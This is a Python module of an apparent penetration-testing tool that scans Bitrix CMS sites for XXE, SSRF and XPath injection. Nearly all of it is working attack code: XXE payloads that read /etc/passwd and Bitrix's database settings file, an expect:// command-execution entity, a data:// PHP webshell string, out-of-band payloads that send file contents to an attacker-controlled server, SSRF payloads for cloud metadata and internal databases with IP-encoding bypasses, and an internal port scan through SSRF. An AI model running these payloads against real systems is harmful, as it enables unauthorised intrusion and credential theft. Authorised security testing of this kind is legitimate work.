#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
XXE/SSRF Scanner Module for Bitrix Pentest Tool
Tests for: XML External Entity injection, Server-Side Request Forgery,
Blind XXE, Out-of-band data exfiltration
"""

import re
import base64
import hashlib
import time
import uuid
from urllib.parse import urljoin, quote, urlparse
from typing import Dict, List, Optional, Tuple, Any
from dataclasses import dataclass, field, asdict


@dataclass
class XXESSRFFinding:
    """XXE/SSRF vulnerability finding"""
    severity: str  # critical, high, medium
    vuln_type: str  # xxe, ssrf, blind_xxe, oob_xxe, xpath_injection
    url: str
    parameter: str
    payload: str
    description: str
    evidence: Optional[str] = None
    oob_server: Optional[str] = None  # For blind/OOB attacks
    internal_service: Optional[str] = None  # Discovered internal service
    
    def to_dict(self) -> Dict[str, Any]:
        return asdict(self)


@dataclass
class XXESSRFResult:
    """Results of XXE/SSRF scanning"""
    target: str
    findings: List[XXESSRFFinding] = field(default_factory=list)
    xxe_vulns: List[Dict] = field(default_factory=list)
    ssrf_vulns: List[Dict] = field(default_factory=list)
    blind_xxe: List[Dict] = field(default_factory=list)
    oob_findings: List[Dict] = field(default_factory=list)
    internal_services: List[str] = field(default_factory=list)
    
    def add_finding(self, finding: XXESSRFFinding):
        self.findings.append(finding)
        
        finding_dict = finding.to_dict()
        if finding.vuln_type == 'xxe':
            self.xxe_vulns.append(finding_dict)
        elif finding.vuln_type == 'ssrf':
            self.ssrf_vulns.append(finding_dict)
        elif finding.vuln_type == 'blind_xxe':
            self.blind_xxe.append(finding_dict)
        elif finding.vuln_type == 'oob_xxe':
            self.oob_findings.append(finding_dict)
        
        if finding.internal_service:
            self.internal_services.append(finding.internal_service)
    
    def get_critical_count(self) -> int:
        return sum(1 for f in self.findings if f.severity == 'critical')
    
    def get_high_count(self) -> int:
        return sum(1 for f in self.findings if f.severity == 'high')
    
    def get_medium_count(self) -> int:
        return sum(1 for f in self.findings if f.severity == 'medium')
    
    def get_low_count(self) -> int:
        return sum(1 for f in self.findings if f.severity == 'low')
    
    def to_dict(self) -> Dict[str, Any]:
        return {
            'target': self.target,
            'summary': {
                'total_findings': len(self.findings),
                'critical': self.get_critical_count(),
                'high': self.get_high_count(),
                'medium': self.get_medium_count(),
                'low': self.get_low_count(),
                'xxe': len(self.xxe_vulns),
                'ssrf': len(self.ssrf_vulns),
                'blind_xxe': len(self.blind_xxe),
                'oob': len(self.oob_findings),
                'internal_services_discovered': len(self.internal_services),
            },
            'internal_services': list(set(self.internal_services)),
            'all_findings': [f.to_dict() for f in self.findings]
        }


class BitrixXXESSRFScanner:
    """
    XXE/SSRF scanner specialized for Bitrix CMS
    """
    
    # XXE payloads
    XXE_PAYLOADS = {
        'basic_file': '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>''',
        
        'basic_php': '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=bitrix/.settings.php">]>
<foo>&xxe;</foo>''',
        
        'basic_expect': '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]>
<foo>&xxe;</foo>''',
        
        'parameter_entity': '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd"> %xxe;]>
<foo>test</foo>''',
        
        'blind_oob': '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://{oob_server}/?data=%file;"> %xxe;]>
<foo>test</foo>''',
        
        'error_based': '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///nonexistent/%file;">]>
<foo>&xxe;</foo>''',
        
        'php_wrapper': '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://input">]>
<foo>&xxe;</foo>''',
        
        'data_wrapper': '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "data://text/plain,<?php system($_GET['cmd']); ?>">]>
<foo>&xxe;</foo>''',
        
        'jar_protocol': '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "jar:http://{oob_server}/test.jar!/test.txt">]>
<foo>&xxe;</foo>''',
        
        'netdoc': '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "netdoc:///etc/passwd">]>
<foo>&xxe;</foo>''',
    }
    
    # SSRF payloads
    SSRF_PAYLOADS = [
        # Internal services
        'http://127.0.0.1/',
        'http://localhost/',
        'http://0.0.0.0/',
        'http://[::1]/',
        'http://169.254.169.254/',  # AWS metadata
        'http://192.168.0.1/',
        'http://10.0.0.1/',
        'http://172.16.0.1/',
        'http://127.0.0.1:22/',  # SSH
        'http://127.0.0.1:3306/',  # MySQL
        'http://127.0.0.1:5432/',  # PostgreSQL
        'http://127.0.0.1:6379/',  # Redis
        'http://127.0.0.1:8080/',  # Alternative HTTP
        'http://127.0.0.1:9200/',  # Elasticsearch
        
        # Protocol smuggling
        'file:///etc/passwd',
        'dict://127.0.0.1:11211/',
        'gopher://127.0.0.1:9000/_',  # PHP-FPM
        'ftp://127.0.0.1:21/',
        'ldap://127.0.0.1:389/',
        
        # Bypass techniques
        'http://0177.0.0.1/',  # Octal
        'http://0x7f.0.0.1/',  # Hex
        'http://2130706433/',  # Decimal
        'http://127.0.0.1.xip.io/',
        'http://127.1/',
        'http://0000:0000:0000:0000:0000:0000:0000:0001/',
        
        # Cloud metadata
        'http://169.254.169.254/latest/meta-data/',
        'http://169.254.169.254/metadata/v1/',
        'http://metadata.google.internal/',
        'http://169.254.169.254/metadata/instance?api-version=2017-04-02',  # Azure
    ]
    
    # Bitrix-specific XXE/SSRF endpoints
    BITRIX_ENDPOINTS = [
        {
            'name': '1C Exchange',
            'url': '/bitrix/admin/1c_exchange.php',
            'method': 'POST',
            'content_type': 'xml',
            'param': 'xml',
        },
        {
            'name': 'SOAP Server',
            'url': '/bitrix/tools/soap_server.php',
            'method': 'POST',
            'content_type': 'soap',
            'param': 'body',
        },
        {
            'name': 'XML Import',
            'url': '/bitrix/admin/catalog_import.php',
            'method': 'POST',
            'content_type': 'xml',
            'param': 'IMPORT_FILE',
        },
        {
            'name': 'Highload Import',
            'url': '/bitrix/tools/highloadblock_tools.php',
            'method': 'POST',
            'content_type': 'xml',
            'param': 'xml',
        },
        {
            'name': 'RSS Import',
            'url': '/bitrix/components/bitrix/rss.out/cache.php',
            'method': 'GET',
            'content_type': 'url',
            'param': 'URL',
        },
        {
            'name': 'WebDAV',
            'url': '/bitrix/webdav/',
            'method': 'PROPFIND',
            'content_type': 'xml',
            'param': 'body',
        },
        {
            'name': 'Document Generator',
            'url': '/bitrix/tools/document_generator.php',
            'method': 'POST',
            'content_type': 'json',
            'param': 'template',
        },
    ]
    
    def __init__(self, requester, logger, parser):
        self.requester = requester
        self.logger = logger
        self.parser = parser
        self.oob_server = None  # Would be configured for blind attacks
        
    def scan(self, target_url: str, aggressive: bool = False) -> XXESSRFResult:
        """
        Main XXE/SSRF scanning method
        
        Args:
            target_url: Target base URL
            aggressive: Enable blind/OOB tests and cloud metadata access
        
        Returns:
            XXESSRFResult with all findings
        """
        self.logger.info(f"Starting XXE/SSRF scan for {target_url}")
        result = XXESSRFResult(target=target_url)
        
        base_url = self._normalize_url(target_url)
        
        # 1. Test for XXE in XML endpoints
        self.logger.info("Testing for XXE vulnerabilities...")
        self._test_xxe(base_url, result)
        
        # 2. Test for SSRF
        self.logger.info("Testing for SSRF vulnerabilities...")
        self._test_ssrf(base_url, result)
        
        # 3. Test Bitrix-specific endpoints
        self.logger.info("Testing Bitrix-specific XXE/SSRF vectors...")
        self._test_bitrix_endpoints(base_url, result)
        
        # 4. Test for blind XXE (if aggressive)
        if aggressive:
            self.logger.info("Testing for blind XXE (OOB)...")
            self._test_blind_xxe(base_url, result)
        
        # 5. Test for XPath injection
        self.logger.info("Testing for XPath injection...")
        self._test_xpath_injection(base_url, result)
        
        # 6. Scan internal services via SSRF
        if result.ssrf_vulns and aggressive:
            self.logger.info("Scanning internal services via SSRF...")
            self._scan_internal_services(base_url, result)
        
        # Summary
        total = len(result.findings)
        critical = result.get_critical_count()
        self.logger.info(f"XXE/SSRF scan complete: {total} findings ({critical} critical)")
        
        if result.internal_services:
            self.logger.warning(f"Internal services discovered: {len(set(result.internal_services))}")
        
        return result
    
    def _normalize_url(self, url: str) -> str:
        """Normalize URL"""
        if not url.startswith(('http://', 'https://')):
            url = 'https://' + url
        return url.rstrip('/')
    
    def _send_xml(self, url: str, xml: str, method: str = 'POST', 
                  headers: Dict = None) -> Optional[Any]:
        """Send XML payload"""
        try:
            default_headers = {
                'Content-Type': 'application/xml',
                'Accept': 'application/xml, text/xml, */*',
            }
            if headers:
                default_headers.update(headers)
            
            if method == 'POST':
                resp = self.requester.post(url, data=xml, headers=default_headers, timeout=15)
            else:
                resp = self.requester.get(url, headers=default_headers, timeout=15)
            
            return resp
        except Exception as e:
            self.logger.debug(f"XML send error: {e}")
            return None
    
    def _test_xxe(self, base_url: str, result: XXESSRFResult):
        """Test for XXE vulnerabilities"""
        # Find XML endpoints
        xml_endpoints = self._discover_xml_endpoints(base_url)
        
        for endpoint in xml_endpoints:
            for payload_name, payload in self.XXE_PAYLOADS.items():
                if 'blind' in payload_name or 'oob' in payload_name:
                    continue  # Skip blind tests for now
                
                try:
                    resp = self._send_xml(endpoint, payload)
                    
                    if not resp:
                        continue
                    
                    # Check for XXE indicators
                    if self._detect_xxe_success(resp.text):
                        finding = XXESSRFFinding(
                            severity='critical',
                            vuln_type='xxe',
                            url=endpoint,
                            parameter='XML body',
                            payload=payload_name,
                            description=f"XXE via {payload_name}",
                            evidence=resp.text[:300]
                        )
                        result.add_finding(finding)
                        self.logger.critical(f"!!! XXE: {payload_name} at {endpoint}")
                        break  # Found XXE, move to next endpoint
                        
                    # Check for error-based XXE
                    if self._detect_xxe_error(resp.text):
                        finding = XXESSRFFinding(
                            severity='high',
                            vuln_type='xxe',
                            url=endpoint,
                            parameter='XML body',
                            payload=payload_name,
                            description=f"Error-based XXE possible: {payload_name}",
                            evidence=resp.text[:200]
                        )
                        result.add_finding(finding)
                        self.logger.warning(f"Potential XXE (error-based): {endpoint}")
                        
                except Exception as e:
                    self.logger.debug(f"XXE test error: {e}")
    
    def _detect_xxe_success(self, content: str) -> bool:
        """Detect successful XXE exploitation"""
        indicators = [
            'root:x:',  # /etc/passwd
            'bin:x:',
            'daemon:x:',
            '<?php',   # PHP file content
            'bitrix',
            'DBHost',
            'DBPassword',
            'uid=',
            'gid=',
        ]
        
        return any(ind in content for ind in indicators)
    
    def _detect_xxe_error(self, content: str) -> bool:
        """Detect XXE-related errors"""
        error_patterns = [
            'java.io.FileNotFoundException',
            'java.net.MalformedURLException',
            'java.net.UnknownHostException',
            'Permission denied',
            'No such file or directory',
            'is not allowed',
            'forbidden',
            'access denied',
            'XML parser error',
            'DOCTYPE is disallowed',
            'External entity',
        ]
        
        return any(err.lower() in content.lower() for err in error_patterns)
    
    def _discover_xml_endpoints(self, base_url: str) -> List[str]:
        """Discover endpoints that accept XML"""
        endpoints = []
        
        # Test known endpoints
        test_paths = [
            '/bitrix/admin/1c_exchange.php',
            '/bitrix/tools/soap_server.php',
            '/bitrix/tools/xml_parser.php',
            '/bitrix/admin/catalog_import.php',
            '/api/',
            '/rest/',
        ]
        
        for path in test_paths:
            url = urljoin(base_url, path)
            try:
                # Test with simple XML
                test_xml = '<?xml version="1.0"?><test/>'
                resp = self._send_xml(url, test_xml)
                
                if resp and resp.status_code in [200, 400, 500]:
                    endpoints.append(url)
                    self.logger.info(f"XML endpoint found: {path}")
                    
            except Exception as e:
                self.logger.debug(f"Error checking {path}: {e}")
        
        return endpoints
    
    def _test_ssrf(self, base_url: str, result: XXESSRFResult):
        """Test for SSRF vulnerabilities"""
        # Find SSRF injection points
        ssrf_points = self._discover_ssrf_points(base_url)
        
        for point in ssrf_points:
            for payload in self.SSRF_PAYLOADS:
                try:
                    if point['method'] == 'GET':
                        url = f"{point['url']}?{point['param']}={quote(payload)}"
                        resp = self.requester.get(url, timeout=10)
                    else:
                        data = {point['param']: payload}
                        resp = self.requester.post(point['url'], data=data, timeout=10)
                    
                    if not resp:
                        continue
                    
                    # Check for SSRF indicators
                    ssrf_indicators = self._detect_ssrf_success(resp, payload)
                    
                    if ssrf_indicators:
                        finding = XXESSRFFinding(
                            severity='critical',
                            vuln_type='ssrf',
                            url=point['url'],
                            parameter=point['param'],
                            payload=payload,
                            description=f"SSRF to {payload}",
                            evidence=ssrf_indicators,
                            internal_service=payload
                        )
                        result.add_finding(finding)
                        self.logger.critical(f"!!! SSRF: {point['url']} -> {payload}")
                        
                        # Extract internal service info
                        self._extract_service_info(resp, payload, result)
                        
                except Exception as e:
                    self.logger.debug(f"SSRF test error: {e}")
    
    def _discover_ssrf_points(self, base_url: str) -> List[Dict]:
        """Discover potential SSRF injection points"""
        points = []
        
        # URL parameters that might cause SSRF
        url_params = ['url', 'uri', 'path', 'file', 'document', 'src', 'href', 'redirect', 'return']
        
        # Test common endpoints
        test_endpoints = [
            {'url': f"{base_url}/bitrix/tools/download.php", 'param': 'file', 'method': 'GET'},
            {'url': f"{base_url}/bitrix/components/bitrix/rss.out/cache.php", 'param': 'URL', 'method': 'GET'},
            {'url': f"{base_url}/bitrix/tools/img.php", 'param': 'src', 'method': 'GET'},
            {'url': f"{base_url}/bitrix/admin/fileman_file_view.php", 'param': 'path', 'method': 'GET'},
        ]
        
        for endpoint in test_endpoints:
            points.append(endpoint)
        
        # Discover from robots.txt and sitemap
        try:
            robots_url = f"{base_url}/robots.txt"
            resp = self.requester.get(robots_url)
            
            if resp:
                # Look for URLs with parameters
                import re
                urls = re.findall(r'[a-zA-Z0-9_]+=[a-zA-Z0-9_]+', resp.text)
                for match in urls:
                    if any(p in match for p in url_params):
                        param = match.split('=')[0]
                        points.append({
                            'url': f"{base_url}/",
                            'param': param,
                            'method': 'GET'
                        })
        except:
            pass
        
        return points
    
    def _detect_ssrf_success(self, response, payload: str) -> Optional[str]:
        """Detect successful SSRF"""
        # Check for service-specific responses
        indicators = {
            'ssh': ['SSH-', 'OpenSSH', 'Protocol mismatch'],
            'mysql': ['mysql_native_password', '5.5.', '5.6.', '5.7.', '8.0.'],
            'postgres': ['FATAL', 'postgresql', 'pg_hba.conf'],
            'redis': ['-ERR', '+OK', 'redis_version'],
            'http': ['HTTP/', '<!DOCTYPE', '<html'],
            'elasticsearch': ['cluster_name', 'elasticsearch'],
            'aws': ['instance-id', 'ami-id', 'hostname', 'local-ipv4'],
        }
        
        text = response.text[:1000]
        
        for service, signs in indicators.items():
            for sign in signs:
                if sign in text:
                    return f"Service detected: {service} (indicator: {sign})"
        
        # Check for different response sizes (indicates internal access)
        if len(response.content) > 0 and response.status_code == 200:
            if '127.0.0.1' in payload or 'localhost' in payload:
                return f"Response received from internal host (size: {len(response.content)})"
        
        return None
    
    def _extract_service_info(self, response, payload: str, result: XXESSRFResult):
        """Extract information about internal services"""
        # AWS metadata
        if '169.254.169.254' in payload:
            if 'instance-id' in response.text:
                result.internal_services.append('AWS EC2')
            elif 'ami-id' in response.text:
                result.internal_services.append(f"AWS AMI: {response.text[:100]}")
        
        # Database versions
        if '5.7.' in response.text or '8.0.' in response.text:
            result.internal_services.append('MySQL 5.7+/8.0+')
        elif 'PostgreSQL' in response.text:
            result.internal_services.append('PostgreSQL')
        
        # Redis
        if 'redis_version' in response.text:
            result.internal_services.append('Redis')
    
    def _test_bitrix_endpoints(self, base_url: str, result: XXESSRFResult):
        """Test Bitrix-specific XXE/SSRF vectors"""
        for endpoint in self.BITRIX_ENDPOINTS:
            url = urljoin(base_url, endpoint['url'])
            
            try:
                if endpoint['content_type'] == 'xml':
                    # Test XXE
                    xxe_payload = self.XXE_PAYLOADS['basic_file']
                    resp = self._send_xml(url, xxe_payload, endpoint['method'])
                    
                    if resp and self._detect_xxe_success(resp.text):
                        finding = XXESSRFFinding(
                            severity='critical',
                            vuln_type='xxe',
                            url=url,
                            parameter=endpoint['param'],
                            payload='XXE in ' + endpoint['name'],
                            description=f"XXE in {endpoint['name']}",
                            evidence=resp.text[:200]
                        )
                        result.add_finding(finding)
                        self.logger.critical(f"!!! BITRIX XXE: {endpoint['name']}")
                
                elif endpoint['content_type'] == 'url':
                    # Test SSRF
                    for ssrf_url in ['http://127.0.0.1/', 'http://169.254.169.254/']:
                        test_url = f"{url}?{endpoint['param']}={quote(ssrf_url)}"
                        resp = self.requester.get(test_url, timeout=10)
                        
                        if resp and resp.status_code == 200:
                            finding = XXESSRFFinding(
                                severity='critical',
                                vuln_type='ssrf',
                                url=url,
                                parameter=endpoint['param'],
                                payload=ssrf_url,
                                description=f"SSRF in {endpoint['name']}"
                            )
                            result.add_finding(finding)
                            self.logger.critical(f"!!! BITRIX SSRF: {endpoint['name']}")
                            break
                            
            except Exception as e:
                self.logger.debug(f"Bitrix endpoint test error: {e}")
    
    def _test_blind_xxe(self, base_url: str, result: XXESSRFResult):
        """Test for blind XXE using OOB technique"""
        if not self.oob_server:
            self.logger.warning("No OOB server configured, skipping blind XXE tests")
            return
        
        # Generate unique identifier
        unique_id = str(uuid.uuid4())[:8]
        oob_url = f"http://{self.oob_server}/{unique_id}"
        
        blind_payload = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "{oob_url}">
%xxe;]>
<foo>test</foo>'''
        
        xml_endpoints = self._discover_xml_endpoints(base_url)
        
        for endpoint in xml_endpoints:
            try:
                resp = self._send_xml(endpoint, blind_payload)
                
                # In real scenario, check OOB server logs for callback
                finding = XXESSRFFinding(
                    severity='high',
                    vuln_type='blind_xxe',
                    url=endpoint,
                    parameter='XML body',
                    payload='OOB XXE',
                    description='Blind XXE (check OOB server logs)',
                    oob_server=self.oob_server
                )
                result.add_finding(finding)
                self.logger.warning(f"Potential blind XXE (check OOB): {endpoint}")
                
            except Exception as e:
                self.logger.debug(f"Blind XXE test error: {e}")
    
    def _test_xpath_injection(self, base_url: str, result: XXESSRFResult):
        """Test for XPath injection"""
        # XPath injection points in Bitrix
        xpath_points = [
            f"{base_url}/bitrix/components/bitrix/catalog.filter/",
            f"{base_url}/bitrix/components/bitrix/iblock.element.add.list/",
        ]
        
        xpath_payloads = [
            "' or '1'='1",
            "' or '1'='2",
            "'] | //* | ['",
            "'] | //password | ['",
            "'] | //user[contains(.,'admin')] | ['",
        ]
        
        for point in xpath_points:
            for payload in xpath_payloads:
                try:
                    resp = self.requester.get(f"{point}?xpath={quote(payload)}")
                    
                    if resp:
                        # Check for XPath errors or changed behavior
                        if 'XPath' in resp.text or 'xml' in resp.text.lower():
                            finding = XXESSRFFinding(
                                severity='medium',
                                vuln_type='xpath_injection',
                                url=point,
                                parameter='xpath',
                                payload=payload,
                                description='Potential XPath injection'
                            )
                            result.add_finding(finding)
                            self.logger.warning(f"Potential XPath injection: {point}")
                            
                except Exception as e:
                    self.logger.debug(f"XPath test error: {e}")
    
    def _scan_internal_services(self, base_url: str, result: XXESSRFResult):
        """Scan internal network via SSRF"""
        if not result.ssrf_vulns:
            return
        
        # Get first working SSRF point
        ssrf_point = result.ssrf_vulns[0]
        
        # Common internal ports
        internal_ports = [80, 443, 8080, 8443, 22, 23, 25, 53, 110, 143, 3306, 5432, 6379, 9200, 27017]
        
        discovered = []
        
        for port in internal_ports:
            try:
                payload = f"http://127.0.0.1:{port}/"
                
                if ssrf_point.get('method') == 'GET':
                    url = f"{ssrf_point['url']}?{ssrf_point['parameter']}={quote(payload)}"
                    resp = self.requester.get(url, timeout=5)
                else:
                    data = {ssrf_point['parameter']: payload}
                    resp = self.requester.post(ssrf_point['url'], data=data, timeout=5)
                
                if resp and resp.status_code in [200, 401, 403]:
                    discovered.append(f"127.0.0.1:{port}")
                    self.logger.info(f"Internal service found: 127.0.0.1:{port}")
                    
            except Exception as e:
                self.logger.debug(f"Port scan error for {port}: {e}")
        
        if discovered:
            result.internal_services.extend(discovered)


# Testing
if __name__ == "__main__":
    import sys
    import logging
    sys.path.append('..')
    
    from utils.requester import Requester
    from utils.logger import ColoredLogger
    from utils.parser import BitrixParser
    
    logger = ColoredLogger(level=logging.DEBUG)
    requester = Requester()
    parser = BitrixParser()
    
    scanner = BitrixXXESSRFScanner(requester, logger, parser)
    
    if len(sys.argv) > 1:
        result = scanner.scan(sys.argv[1], aggressive=True)
        print(f"\n{'='*60}")
        print(f"CRITICAL: {result.get_critical_count()}")
        print(f"XXE: {len(result.xxe_vulns)}")
        print(f"SSRF: {len(result.ssrf_vulns)}")
        print(f"Blind XXE: {len(result.blind_xxe)}")
        print(f"Internal services: {len(set(result.internal_services))}")
        print(f"Findings: {len(result.findings)}")
